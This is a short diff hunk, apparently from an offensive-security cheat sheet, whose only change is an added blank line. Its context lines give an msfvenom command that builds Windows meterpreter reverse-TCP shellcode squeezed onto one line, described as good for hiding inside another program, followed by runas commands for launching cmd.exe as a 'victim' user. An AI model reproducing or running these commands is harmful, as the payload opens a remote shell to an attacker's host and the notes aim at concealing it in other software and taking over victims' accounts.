@@ -53,6 +53,7 @@ create a meterpreter shellcode for single line good for hide in the another prog
     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f c | tr -d '\n' | sed 's/ //g'
 
 runas.exe
+
     net users
     runas /user:usernameofvictim "cmd.exe"
     runas /user:Machinename\usernameofvictim "cmd.exe"
